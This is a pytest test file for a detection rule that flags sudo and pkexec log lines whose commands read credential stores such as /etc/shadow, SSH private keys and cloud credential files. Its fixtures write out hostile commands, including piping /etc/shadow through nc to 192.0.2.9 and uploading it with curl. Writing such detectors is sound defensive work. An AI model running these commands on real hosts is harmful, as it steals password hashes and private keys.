"""host.privilege_broker_credential_args: sudo and pkexec log the command they decide on; a command whose arguments
name a credential store is reported, from the broker's own line, on hosts with no process auditing."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect.privilege_brokers import (
    BROKER_CREDENTIAL_ROUTINE,
    PrivilegeBrokerCredentialArgs,
    broker_credential_class,
)
from romulus.evidence.typed import Outcome
from tests.test_linux_text_breadth import one

T0 = datetime(2026, 11, 9, 12, tzinfo=UTC)
_n = 0


def sudo(command, *, actor="alice", target="root", tty="pts/0", pwd="/home/alice", reason=None, shape="journal",
         offset=0, host="app01"):
    global _n
    _n += 1
    head = f"{actor} : {reason} ; " if reason else f"{actor} : "
    body = head + (f"TTY={tty} ; " if tty else "") + f"PWD={pwd} ; USER={target} ; COMMAND={command}"
    stamp = (T0 + timedelta(seconds=offset)).isoformat().replace("+00:00", "Z")
    return one(shape, "sudo", body, nid=f"bc-{_n}", stamp=stamp, host=host)


def judge(*events):
    rule = PrivilegeBrokerCredentialArgs()
    try:
        return rule, rule.consume(list(events))
    finally:
        rule.close_spill()


@pytest.mark.parametrize("shape", ["journal", "journal-fields", "syslog", "raw"])
def test_an_interactive_sudo_read_of_the_hash_file_is_high_in_every_shipper_shape(shape):
    rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow", shape=shape))
    assert (m.proposed_lane, m.severity) == ("high", "high")
    assert "sudo allowed 'alice' to run as 'root' the command '/usr/bin/cat /etc/shadow' from terminal pts/0" in m.claim
    assert "'cat' reads the files it is given" in m.claim and "the local password-hash file /etc/shadow" in m.claim
    assert "not that the command ran to completion or read the file" in m.claim
    assert m.attack == ("T1003.008",)
    assert {p.field for p in m.predicate} >= {"auth.service", "user.name", "sudo.command", "process.tty"}
    assert rule.missing_required == 0


@pytest.mark.parametrize("command, technique", [
    ("/usr/bin/less /root/.ssh/id_ed25519", "T1552.004"),
    ("/bin/cp /etc/ssh/ssh_host_rsa_key /tmp/k", "T1552.004"),
    ("/usr/bin/grep root /etc/gshadow", "T1003.008"),
    ("/usr/bin/base64 -w0 /etc/shadow-", "T1003.008"),
    ("/bin/dd if=/etc/shadow of=/dev/shm/s", "T1003.008"),
    ("/bin/sh -c cat /etc/shadow | nc 192.0.2.9 4444", "T1003.008"),
    ("/usr/bin/env LANG=C timeout 5 /usr/bin/head -n 3 /etc/shadow", "T1003.008"),
])
def test_reads_of_hash_files_and_private_keys_through_readers_wrappers_and_scripts(command, technique):
    _rule, [m] = judge(sudo(command))
    assert m.proposed_lane == "high" and technique in m.attack


@pytest.mark.parametrize("command", [
    "/usr/bin/tee /etc/sudoers.d/x",                         # a write destination
    "/usr/bin/install -m 600 k /root/.ssh/id_rsa",
    "/usr/bin/rsync -a keys/ /root/.ssh/",
    "/bin/tar xzf b.tgz -C /root/.ssh",
    "/bin/tar czf /tmp/k.tgz /home/bob/.ssh",                # an archiver may read or write: named, not read
    "/usr/bin/curl -o /etc/ssl/private/s.key https://pki.example.test/s.key",
    "/usr/bin/openssl genrsa -out /etc/ssl/private/s.key 2048",
])
def test_programs_that_may_write_their_operands_only_name_them_as_leads(command):
    _rule, [m] = judge(sudo(command))
    assert m.proposed_lane == "lead" and "a program not known here to read its arguments" in m.claim


def test_a_copy_onto_a_key_path_is_a_write_and_never_a_joined_path():
    _rule, out = judge(sudo("/bin/cp /tmp/a /root/.ssh/id_rsa"))
    assert out == []


def test_two_credential_reads_in_one_command_name_the_other():
    _rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow /root/.ssh/id_rsa"))
    assert "also name 1 other credential path(s): ['/root/.ssh/id_rsa']" in m.claim


@pytest.mark.parametrize("command, reported", [
    ("/bin/chmod 644 /etc/shadow", True), ("/bin/chmod o+r /root/.ssh/id_rsa", True), ("/bin/chmod a+rw /etc/gshadow", True),
    ("/bin/chmod 600 /root/.ssh/id_rsa", False), ("/bin/chmod 640 /etc/shadow", False), ("/bin/chmod g+r /etc/shadow", False),
    ("/bin/chmod 644 /etc/ssh/ssh_host_rsa_key.pub", False), ("/bin/chmod 644 /etc/sudoers", False),
])
def test_making_the_hash_files_or_a_key_world_readable_is_a_lead(command, reported):
    _rule, out = judge(sudo(command))
    assert bool(out) is reported
    if reported:
        assert out[0].proposed_lane == "lead" and "readable by every account" in out[0].claim


def test_a_relative_operand_is_placed_with_the_logged_working_directory():
    _rule, [m] = judge(sudo("/usr/bin/cat shadow", pwd="/etc"))
    assert m.proposed_lane == "high" and "/etc/shadow" in m.claim


def test_a_redirect_into_a_shell_script_is_a_read():
    _rule, [m] = judge(sudo("/bin/bash -c base64 < /etc/shadow"))
    assert m.proposed_lane == "high"


@pytest.mark.parametrize("command, technique, description", [
    ("/usr/bin/cat /home/bob/.aws/credentials", "T1552.001", "AWS credentials"),
    ("/usr/bin/cp /home/bob/Documents/vault.kdbx /tmp/", "T1555.005", "password-manager vault"),
    ("/usr/bin/sqlite3 /home/bob/.config/google-chrome/Default/Login Data", "T1555.003", "saved-login store"),
    ("/usr/bin/cat /etc/sudoers", "T1548.003", "sudoers policy"),
    ("/usr/bin/cat /home/bob/.config/gcloud/application_default_credentials.json", "T1552.001", "cloud SDK"),
])
def test_other_credential_stores_are_leads(command, technique, description):
    _rule, [m] = judge(sudo(command))
    assert m.proposed_lane == "lead" and technique in m.attack and description in m.claim


def test_without_a_terminal_a_hash_read_is_a_lead_but_a_web_account_is_high():
    _rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow", tty=None))
    assert m.proposed_lane == "lead" and "without a terminal" in m.claim
    _rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow", tty=None, actor="www-data", pwd="/var/www"))
    assert m.proposed_lane == "high" and "'www-data' is a web-service account" in m.claim


def test_a_program_not_known_to_read_its_arguments_is_a_lead_worded_as_naming():
    _rule, [m] = judge(sudo("/opt/tools/collect /etc/shadow"))
    assert m.proposed_lane == "lead"
    assert "An argument of 'collect', a program not known here to read its arguments, names" in m.claim
    _rule, [m] = judge(sudo("/usr/bin/curl -F f=@/etc/shadow https://upload.example.test/"))
    assert m.proposed_lane == "high" and "'curl' reads the files it is given" in m.claim


def test_a_refused_read_is_a_lead_naming_the_reason():
    _rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow", reason="user NOT in sudoers"))
    assert m.proposed_lane == "lead" and "sudo refused (user NOT in sudoers) 'alice'" in m.claim


@pytest.mark.parametrize("command", [
    "/bin/ls -l /etc/shadow",                       # metadata, not contents
    "/bin/chmod 640 /etc/shadow",
    "/usr/bin/stat /root/.ssh/id_rsa",
    "/usr/bin/grep shadow /var/log/auth.log",       # the name in a search pattern
    "/usr/bin/grep -r /etc/shadow /var/log",        # ... and as the pattern of a recursive search
    "/usr/bin/dpkg -S /etc/shadow",                 # a package query
    "/usr/bin/rpm -qf /etc/shadow",
    "/usr/sbin/visudo",
    "/usr/sbin/visudo -cf /etc/sudoers",            # the sanctioned sudoers editor and checker
    "/usr/sbin/vipw -s",
    "/usr/bin/passwd bob",
    "/usr/sbin/chpasswd",
    "/usr/bin/ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key",
    "/sbin/auditctl -w /etc/shadow -p r -k shadow", # an audit watch on the file
    "/sbin/ausearch -f /etc/shadow",                # an analyst's audit-log search
    "/bin/echo /etc/shadow",                        # the name in echoed text
    "/usr/bin/cat /etc/ssh/ssh_host_rsa_key.pub",   # a public key
    "/usr/bin/cat /home/alice/notes/shadow.txt",    # the word in another file's name
    "/usr/bin/apt install keepassxc",               # a password manager in a package list
    "/usr/bin/cat /root/.ssh/authorized_keys /root/.ssh/known_hosts",
])
def test_hard_benign_lookalikes_are_not_reported(command):
    rule, matches = judge(sudo(command))
    assert matches == [] and rule.missing_required == 0


def test_routine_tools_are_documented():
    assert {"visudo", "vipw", "passwd", "dpkg", "rpm", "ls", "auditctl", "ssh-keygen"} <= BROKER_CREDENTIAL_ROUTINE
    assert broker_credential_class("/etc/passwd") is None
    assert broker_credential_class("/etc/sudoers.d/90-cloud-init-users")[0] == "T1548.003"


def test_a_pkexec_command_is_read_the_same_way():
    line = ("alice: Executing command [USER=root] [TTY=/dev/pts/1] [CWD=/home/alice] "
            "[COMMAND=/usr/bin/cat /etc/shadow]")
    event = one("journal", "pkexec", line, nid="pk-1")
    _rule, [m] = judge(event)
    assert m.proposed_lane == "high" and "pkexec allowed 'alice'" in m.claim


def test_retries_fold_into_one_finding_with_their_count():
    rule = PrivilegeBrokerCredentialArgs()
    try:
        first = rule.consume([sudo("/usr/bin/cat /etc/shadow", offset=i) for i in range(3)])
        later = rule.consume([sudo("/usr/bin/cat /etc/shadow", offset=3600)])   # the next partition's first second
    finally:
        rule.close_spill()
    assert len(first) == 1 and later[0].group_key == first[0].group_key
    assert later[0].aggregate_summary["count"] == 4


def test_missing_command_and_unknown_outcome_are_never_a_clean_no_match():
    unrecorded = sudo("/usr/bin/cat /etc/shadow")
    del unrecorded.fields["sudo.command"]
    unknown = sudo("/usr/bin/cat /etc/shadow")
    unknown.outcome = Outcome.unknown
    rule, matches = judge(unrecorded, unknown)
    assert rule.missing_required == 2
    assert [m.proposed_lane for m in matches] == ["lead"]
    assert "with an unknown decision" in matches[0].claim


def test_su_and_other_records_are_out_of_scope():
    su = one("journal", "su", "FAILED SU (to root) alice on pts/0", nid="su-1")
    rule, matches = judge(su)
    assert matches == [] and rule.missing_required == 0


def test_claims_cite_what_they_state():
    from tests.test_claim_citations import clean
    _rule, matches = judge(sudo("/usr/bin/cat /etc/shadow /root/.ssh/id_rsa"), sudo("/opt/x/run /etc/shadow"))
    clean(matches)


def test_many_routine_sudo_lines_give_nothing_but_the_reads():
    """A fleet's day of routine sudo: package updates, service restarts, log reads, permission fixes. Only the two
    credential reads are reported, each folded to one finding however often it repeats."""
    from romulus.evidence.typed import RawRef, TypedEvent, fv
    template = sudo("/usr/bin/systemctl restart nginx")
    routine = ["/usr/bin/apt-get -y upgrade", "/usr/bin/systemctl restart nginx", "/usr/bin/tail -n 50 /var/log/syslog",
               "/bin/chmod 600 /root/.ssh/id_rsa", "/usr/bin/journalctl -u ssh", "/usr/bin/dpkg -S /etc/shadow"]
    rule = PrivilegeBrokerCredentialArgs()
    out = []
    try:
        for batch in range(20):
            events = []
            for i in range(2_500):
                n = batch * 2_500 + i
                command = routine[n % len(routine)]
                if n % 9_973 == 0:
                    command = "/usr/bin/cat /etc/shadow" if n % 2 else "/usr/bin/cp /root/.ssh/id_rsa /tmp/k"
                fields = {**template.fields, "sudo.command": fv(command, f"bulk{n}:sudo.command")}
                events.append(TypedEvent(id=f"bulk{n}", family="privilege_use", ts=T0 + timedelta(seconds=n),
                                         host="app01", outcome=Outcome.success, fields=fields,
                                         raw=[RawRef(target="fx", native_id=f"bulk{n}")], normalizer="fixture"))
            out += rule.consume(events)
    finally:
        rule.close_spill()
    assert {m.group_key for m in out} == {out[0].group_key, out[-1].group_key} and len({m.group_key for m in out}) == 2
    assert {("shadow" in m.claim, "id_rsa" in m.claim) for m in out} == {(True, False), (False, True)}
    assert rule.evaluated == 50_000


@pytest.mark.parametrize("command, path", [
    ("/usr/bin/cat /root/.aws/credentials /etc/shadow", "/etc/shadow"),
    ("/usr/bin/cat /etc/sudoers /etc/shadow", "/etc/shadow"),
    ("/bin/sh -c tar czf /tmp/a.tgz /root/.ssh; cat /etc/shadow", "/etc/shadow"),
    ("/usr/bin/cat /root/.ssh/id_rsa.pub /root/.ssh/id_rsa", "/root/.ssh/id_rsa"),
])
def test_the_strongest_named_store_decides_whatever_the_argument_order(command, path):
    _rule, [m] = judge(sudo(command))
    assert m.proposed_lane == "high" and m.severity == "high"
    assert "'cat' reads the files it is given, and its arguments name" in m.claim and path in m.claim


@pytest.mark.parametrize("command", [
    "/bin/bash -c cat /etc/shadow|base64",
    "/bin/bash -c cat /etc/shadow;id",
    "/bin/bash -c cat /etc/shadow>/tmp/s",
    "/bin/bash -c cat</etc/shadow",
    "/bin/bash -c base64</etc/shadow|nc 192.0.2.9 80",
    "/bin/bash -c 'cat /etc/shadow'",
    "/usr/bin/env -u FOO /usr/bin/cat /etc/shadow",
    "/usr/bin/nice -n 10 cat /etc/shadow",
    "/usr/bin/timeout -s KILL 5 cat /etc/shadow",
    "/usr/bin/ionice -c 2 -n 0 cat /etc/shadow",
    "/bin/busybox cat /etc/shadow",
])
def test_unspaced_shell_syntax_and_wrapper_option_values_are_read(command):
    _rule, [m] = judge(sudo(command))
    assert m.proposed_lane == "high" and "/etc/shadow" in m.claim
